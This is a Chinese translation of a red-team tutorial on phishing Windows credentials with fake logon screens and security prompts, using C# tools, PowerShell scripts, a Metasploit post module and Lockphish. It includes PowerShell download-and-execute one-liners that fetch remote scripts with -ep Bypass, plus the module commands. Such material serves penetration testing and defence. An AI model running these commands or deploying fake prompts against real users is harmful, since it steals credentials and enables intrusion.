**在Windows环境中，当程序执行时经常会需要用户输入自己的域凭证来实现身份验证，或者说在触发用户账号控制时要求用户输入凭证来实现授权或提权，这种情况是很常见的。通过模仿Windows的这种行为，研究人员将有可能获取到Windows用户的凭证数据，而这些凭证后续将有可能被用于红队安全评估过程中的横向移动/渗透。**

##  C#方法

现代红队技术有很多都需要依赖于C#语言来实现，因为这种语言的特性之一就是允许类似Cobalt
Strike和Covenant之类的框架来在内存中执行代码。FakeLogonScreen是一款采用C#开发的Windows实用程序，该工具可以伪造Windows登录界面并尝试从当前用户身上获取凭证密码。

![](https://image.3001.net/images/20200305/1583383798_5e6084f679d2d.png!small)

该工具能够显示当前设备所配置的登录界面背景，这样可以降低用户的防范意识，以成功实现恶意操作。

![](https://image.3001.net/images/20200305/1583383807_5e6084ff42db1.png!small)

当用户在伪造的登录界面输入了自己的密码之后，该工具将会对用户输入的密码进行验证以确保密码的正确性。此时，密码将会显示在攻击者的命令控制台中。

![](https://image.3001.net/images/20200305/1583383820_5e60850caf462.png!small)

项目中的二级代码可以将获取到的凭证存储到目标设备本地磁盘中的user.db文件中，我们可以执行下列命令来从中读取出包含的域用户凭证：

    
    
    type C:\Users\pentestlab.PENTESTLAB\AppData\Local\Microsoft\user.db

![](https://image.3001.net/images/20200305/1583383831_5e608517be08f.png!small)

当然了，社区还有一个名叫[SharpLocker](https://github.com/Pickfordmatt/SharpLocker)的类似工具，该工具由[Matt
Pickford](https://twitter.com/Mattspickford)开发，它也可以伪造Windows的用户登录界面。

![](https://image.3001.net/images/20200305/1583383837_5e60851dc0985.png!small)

用户在此界面上输入的每一个键盘击键信息都可以直接在命令控制台中显示出来：

![](https://image.3001.net/images/20200305/1583383843_5e6085233cf4c.png!small)

##  PowerShell方法

Windows安全输入提示非常常见，因为公司环境中的应用程序可能会定期要求用户进行身份验证。Microsoft
outlook是一种通常在域环境中执行凭据请求的产品。CredsLeaker这款软件可以尝试模拟Windows的安全提示，它可以使用Web服务器来将用户输入的凭证密码以文件的形式进行存储，并利用PowerShell来调用HTTP请求。其中，PowerShell命令可以直接通过BAT文件来调用和执行。

    
    
    run.bat

![](https://image.3001.net/images/20200305/1583383854_5e60852e05f4c.png!small)

在执行BAT文件之前，我们需要修改配置负责存储配置文件、PHP以及PowerShell文件的Web服务器。当BAT文件执行后，将会弹出Windows安全窗口并显示给用户。

![](https://image.3001.net/images/20200305/1583383859_5e60853362228.png!small)

该工具会对获取到的凭证进行验证，只有当用户提供正确的密码时，安全弹窗才会消失，域、主机名、用户名和密码将写入以下位置。

    
    
    /var/www/html/creds.txt

![](https://image.3001.net/images/20200305/1583383866_5e60853ac71ff.png!small)

[Matt
Nelson](https://twitter.com/enigma0x3)开发了一个[PowerShell脚本](https://github.com/enigma0x3/Invoke-LoginPrompt)，它能够生成一个可以验证凭证是否有效的输入弹窗，并且只有当输入凭证正确时弹窗才会关闭。该脚本可以通过远程执行，并在命令控制台中显示凭证。

    
    
    powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('http://10.0.0.13/tmp/Invoke-LoginPrompt.ps1')); Invoke-LoginPrompt

![](https://image.3001.net/images/20200305/1583383876_5e6085446ab82.png!small)

Nishang框架同样包含了一个能够创建伪造输入弹窗的[PowerShell脚本](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-CredentialsPhish.ps1)。

![](https://image.3001.net/images/20200305/1583383881_5e6085497fdd9.png!small)

输入弹窗将包含一条消息，告诉用户执行此操作需要凭据。更具安全意识的用户可能会发现某些内容已在后台执行了，但攻击操作不会同时对所有公司用户执行。

![](https://image.3001.net/images/20200305/1583383887_5e60854fe12c8.png!small)

当用户的凭据输入到Windows框中时，这些凭据将在命令控制台中显示。

![](https://image.3001.net/images/20200305/1583383895_5e60855722666.png!small)

或者，我们也可以从远程位置执行该脚本以绕过检测。

    
    
    powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('http://10.0.0.13/tmp/Invoke-CredentialsPhish/ps1')); Invoke-CredentialsPhish

![](https://image.3001.net/images/20200305/1583383906_5e608562560ec.png!small)

##  Metasploit方法

Metasploit Framework有一个模块，它可以在特定进程或任意进程创建时生成一个输入弹窗，该模块必须跟一个现有的Meterpreter会话绑定。

    
    
    use post/windows/gather/phish_windows_credentials
    
        set SESSION 3
    
        set PROCESS *
    
        run

![](https://image.3001.net/images/20200305/1583383924_5e608574be515.png!small)

通配符*指示模块监视系统上运行的所有进程，并等待新实例启动，以便向用户显示伪造的输入提示。

![](https://image.3001.net/images/20200305/1583383931_5e60857b783ab.png!small)

输入提示将作为进程的凭证请求显示给用户。

![](https://image.3001.net/images/20200305/1583383936_5e6085804620b.png!small)

当用户输入他的凭据时，这些凭据将被捕获并显示在控制台中。

![](https://image.3001.net/images/20200305/1583383943_5e608587a5b22.png!small)

或者，可以将模块配置为仅监视特定进程的创建。

![](https://image.3001.net/images/20200305/1583383953_5e60859104df0.png!small)

##  BASH方法

[Lockphish](https://github.com/thelinuxchoice/lockphish)这款工具同样能够伪造Windows登录界面并帮助攻击者执行钓鱼攻击，相关的伪造模板需要托管在PHP服务器中。

    
    
    bash lockphish.sh

![](https://image.3001.net/images/20200305/1583383962_5e60859a71778.png!small)

为了诱骗用户点击登录界面中的按钮或链接，攻击者还需要配合社会工程学技术。

![](https://image.3001.net/images/20200305/1583383968_5e6085a03011f.png!small)

此时，工具会在需要管理员帐户密码的用户界面上显示一个伪造的登录界面。但是与其他工具相比，这个工具所伪造的界面密码字段有些对不整齐。

![](https://image.3001.net/images/20200305/1583383974_5e6085a666721.png!small)

一旦用户输入他的凭据，工具就会将用户重定向到YouTube网站。

![](https://image.3001.net/images/20200305/1583383984_5e6085b0d9d34.png!small)

此时，用户输入的凭证将会显示在控制台中。

![](https://image.3001.net/images/20200305/1583383990_5e6085b6d4a36.png!small)

##  参考资料

> 1、<https://attack.mitre.org/techniques/T1141/>
>
> 2、<https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-> just-ask/>
>
> 3、<https://github.com/enigma0x3/Invoke-LoginPrompt>
>
> 4、<https://github.com/samratashok/nishang/blob/master/Gather/Invoke-> CredentialsPhish.ps1>
>
> 5、<https://github.com/bitsadmin/fakelogonscreen>
>
> 6、<https://github.com/Pickfordmatt/SharpLocker>
>
> 7、<https://malicious.link/post/2015/powershell-popups-and-capture/>
>
> 8、<https://github.com/Dviros/CredsLeaker>
>
> 9、<https://github.com/thelinuxchoice/lockphish>

 *** 参考来源：[pentestlab](https://pentestlab.blog/2020/03/02/phishing-windows-credentials/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

